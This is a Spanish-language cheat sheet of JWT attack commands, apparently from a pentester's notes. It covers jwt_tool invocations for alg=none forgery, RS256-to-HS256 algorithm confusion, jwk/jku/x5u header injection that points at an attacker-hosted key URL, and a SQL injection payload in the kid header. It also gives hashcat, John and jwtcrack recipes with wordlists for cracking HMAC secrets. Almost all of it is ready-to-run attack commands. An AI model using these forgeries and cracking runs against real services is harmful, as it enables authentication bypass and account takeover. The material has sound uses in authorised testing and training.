---
aliases:
  - jwt_tool
  - jwtcrack
  - JWT Hashcat
  - JWT Bruteforce Tools
tags:
  - type/cheatsheet
  - vuln/jwt
  - technique/credential-access
  - asset/web-app
  - cred/jwt
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[JWT Attacks]]"
  - "[[hashcat]]"
  - "[[john]]"
---
# JWT - Tooling y Brute Force

***

## jwt_tool (All-in-One)

| **Objetivo** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Instalación | `git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool && pip install -r requirements.txt` | Python 3. |
| Decode + análisis | `python3 jwt_tool.py <token>` | Sin args = decode + heuristics. |
| Tampering interactivo | `python3 jwt_tool.py <token> -T` | Modifica claims interactively + re-firma. |
| Probe automático | `python3 jwt_tool.py <token> -M pb -t https://target/api -rh "Authorization: Bearer <token>"` | Playbook automático: alg=none + null sig + alg confusion. |
| alg=none forge | `python3 jwt_tool.py <token> -X a` | Genera variantes none/None/NONE/nOnE. |
| Algorithm confusion | `python3 jwt_tool.py <token> -X k -pk public.pem` | RS256 → HS256 con pública. |
| jwk header inject | `python3 jwt_tool.py <token> -X i` | Auto-genera par RSA + inyecta jwk. |
| jku header inject | `python3 jwt_tool.py <token> -X s -ju http://attacker/jwks.json -pk priv.pem` | Atacante hostea JWKS. |
| x5u inject | `python3 jwt_tool.py <token> -X s -ku http://attacker/cert.pem` | Cert chain. |
| kid SQLi inject | `python3 jwt_tool.py <token> -I -hc kid -hv "x' UNION SELECT 'AAA' -- "` | Modifica header `kid`. |
| Crack secret | `python3 jwt_tool.py <token> -C -d wordlist.txt` | Bruteforce HS256. |
| Forzar alg específico | `python3 jwt_tool.py <token> -S hs256 -p "secret"` | Re-firmar con alg + secret dado. |
| Crear nuevo desde cero | `python3 jwt_tool.py -Q <preset>` | Templates: oauth, oidc, custom. |
^jwt-tool-jwttool

### Flags clave

| Flag | Función |
|---|---|
| `-T` | Tamper interactivo |
| `-M pb` | Modo playbook (probe completo) |
| `-X <a/k/i/s>` | Exploit auto: alg-none / alg-confusion / inject-jwk / inject-jku-x5u |
| `-I` | Modificar headers |
| `-C` | Crack mode |
| `-d` | Diccionario para crack |
| `-S <alg>` | Re-firmar con algoritmo |
| `-p <secret>` | Secret HMAC |
| `-pk <file>` | Clave privada (RS256/ES256) |
| `-rh` | Headers extra al hacer requests |

___

## Hashcat HS256

| **Objetivo** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Modo JWT | `-m 16500` | HMAC-SHA256 (JWT). |
| Bruteforce dictionary | `hashcat -m 16500 token.txt rockyou.txt` | Wordlist clásica. |
| Con rules | `hashcat -m 16500 token.txt rockyou.txt -r best64.rule` | Mutaciones aplicadas. |
| Mask attack | `hashcat -m 16500 -a 3 token.txt ?l?l?l?l?l?l?l?l` | 8 chars lowercase. |
| Mask alfanumérico | `hashcat -m 16500 -a 3 token.txt ?a?a?a?a?a?a?a?a` | Charset completo (~95 chars). |
| Combinator attack | `hashcat -m 16500 -a 1 token.txt list1.txt list2.txt` | Concat de wordlists. |
| Hybrid mask + dict | `hashcat -m 16500 -a 6 token.txt rockyou.txt ?d?d?d?d` | Wordlist + 4 dígitos. |
| Resume | `hashcat --restore` | Continuar interrumpido. |
| Show cracked | `hashcat -m 16500 token.txt --show` | Ver resultado tras crack. |
| GPU specs | `hashcat -b -m 16500` | Benchmark velocidad local. |
| Potfile | `--potfile-path=jwt.pot` | Separar resultados. |
^jwt-tool-hashcat

### Wordlists recomendadas

```bash
# JWT-specific (assetnote)
wget https://github.com/wallarm/jwt-secrets/raw/master/jwt.secrets.list

# Defaults dev
echo -e "secret\nsecretkey\nyoursecret\nsupersecret\njwt_secret\nchange_me" > defaults.txt

# Combo
cat defaults.txt rockyou.txt jwt.secrets.list > combo.txt
sort -u combo.txt -o combo.txt
hashcat -m 16500 token.txt combo.txt -r best64.rule
```

___

## jwtcrack y John

| **Objetivo** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| jwtcrack install | `git clone https://github.com/lmammino/jwt-cracker && cd jwt-cracker && npm install` | Node — bruteforce charset corto. |
| jwtcrack run | `jwt-cracker -t <token> -a abcdefghijklmnopqrstuvwxyz -m 6` | Charset + max length. |
| jwtcrack con dict | `jwt-cracker -t <token> -d wordlist.txt` | Wordlist mode. |
| John format JWT | `john --wordlist=rockyou.txt token.txt --format=HMAC-SHA256` | CPU mode. |
| John reglas | `john --wordlist=rockyou.txt --rules=Wordlist token.txt --format=HMAC-SHA256` | Mutaciones. |
| John show | `john --show token.txt --format=HMAC-SHA256` | Ver resultado. |
| Convertir a john format | `echo "$jwt" \| awk -F. '{print $1"."$2"#"$3}'` | Solo si john lo requiere — versiones modernas aceptan JWT crudo. |
| Hash extraction | `python3 -c "h=open('jwt.txt').read().strip(); s=h.rsplit('.',1)[0]; print(f'{s}#{h.rsplit(\".\",1)[1]}')"` | Para john legacy. |
| jwt2john.py | Script auxiliar | Si la versión de john no acepta JWT directo. |
| jwt-cracker docker | `docker run -v $PWD:/data jwt-cracker -t <token> -d /data/words.txt` | Sin instalar dependencias. |
^jwt-tool-jwtcrack

### Comparación de tools

| Tool | Velocidad | Uso recomendado |
|---|---|---|
| **hashcat** (-m 16500) | Más rápido (GPU) | Secrets >7 chars |
| **john** | CPU mid | Sin GPU disponible |
| **jwtcrack** | Lento (JS) | Charset chico (≤5 chars) |
| **jwt_tool -C** | Wrapper conveniente | Recon rápido + crack mode |

***
